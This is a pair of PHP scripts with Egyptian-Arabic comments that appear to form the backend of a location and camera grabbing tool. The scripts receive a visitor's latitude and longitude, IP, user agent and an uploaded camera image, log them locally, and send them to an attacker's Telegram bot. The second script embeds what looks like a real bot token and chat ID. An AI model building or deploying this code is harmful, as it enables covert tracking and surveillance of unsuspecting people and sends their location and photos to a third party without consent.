<?php
// إعدادات التليجرام
$bot_token = "YOUR_BOT_TOKEN"; // ← حط التوكن بتاع البوت هنا
$chat_id = "YOUR_CHAT_ID";     // ← حط الـ chat ID هنا

// تأكد إن الطلب جاي بطريقة POST
if ($_SERVER['REQUEST_METHOD'] === 'POST') {

    // استقبل بيانات الموقع
    $lat = $_POST['latitude'] ?? '0';
    $lon = $_POST['longitude'] ?? '0';
    $location_url = "https://www.google.com/maps?q=$lat,$lon";

    // استقبل بيانات أخرى لو فيه
    $ip = $_POST['ip'] ?? 'Unknown IP';
    $ua = $_SERVER['HTTP_USER_AGENT'] ?? 'Unknown UA';

    // سجل في ملف محلي (نسخة احتياطية)
    $logData = "IP: $ip\nLocation: $location_url\nUser-Agent: $ua\n------\n";
    file_put_contents("logs/data.txt", $logData, FILE_APPEND);

    // ابعت الموقع لتليجرام
    $message = "📍 **تم تحديد موقع جديد**\n";
    $message .= "🌐 IP: $ip\n";
    $message .= "🧭 الموقع: $location_url\n";
    $message .= "📱 User: $ua";

    file_get_contents("https://api.telegram.org/bot$bot_token/sendMessage?chat_id=$chat_id&text=" . urlencode($message));

    // استقبل صورة الكاميرا (لو اتبعتت)
    if (isset($_FILES['image']) && $_FILES['image']['error'] === 0) {
        $target_path = "logs/" . basename($_FILES['image']['name']);
        move_uploaded_file($_FILES['image']['tmp_name'], $target_path);

        // ابعت الصورة لتليجرام
        $sendPhotoUrl = "https://api.telegram.org/bot$bot_token/sendPhoto";
        $post_fields = [
            'chat_id' => $chat_id,
            'photo' => new CURLFile(realpath($target_path))
        ];

        $ch = curl_init();
        curl_setopt($ch, CURLOPT_HTTPHEADER, ["Content-Type:multipart/form-data"]);
        curl_setopt($ch, CURLOPT_URL, $sendPhotoUrl);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
        curl_setopt($ch, CURLOPT_POSTFIELDS, $post_fields);
        $output = curl_exec($ch);
        curl_close($ch);
    }

    // رد ناجح للعميل
    echo "Data received successfully";
} else {
    echo "Invalid request method!";
}
?>
<?php
$bot_token = "5670694895:AAH5eMZfNc1O6bYEl3inJb-NjTObKBjoRUc"; // ← حط التوكن بتاعك هنا
$chat_id = "5523186139"; // ← حط الـ chat id بتاعك هنا

$message = "📍 تم سحب بيانات جديدة:\n";
$message .= "📸 صورة الكاميرا: [مرفقة]\n";

// ابعت الرسالة النصية
file_get_contents("https://api.telegram.org/bot$bot_token/sendMessage?chat_id=$chat_id&text=" . urlencode($message));

// لو فيه صورة مرفقة:
$photo_path = "logs/image.jpg"; // ← غيّر لو عندك اسم تاني
if (file_exists($photo_path)) {
    $sendPhotoUrl = "https://api.telegram.org/bot$bot_token/sendPhoto";
    $post_fields = [
        'chat_id' => $chat_id,
        'photo' => new CURLFile(realpath($photo_path))
    ];

    $ch = curl_init();
    curl_setopt($ch, CURLOPT_HTTPHEADER, ["Content-Type:multipart/form-data"]);
    curl_setopt($ch, CURLOPT_URL, $sendPhotoUrl);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS, $post_fields);
    $output = curl_exec($ch);
}
?>
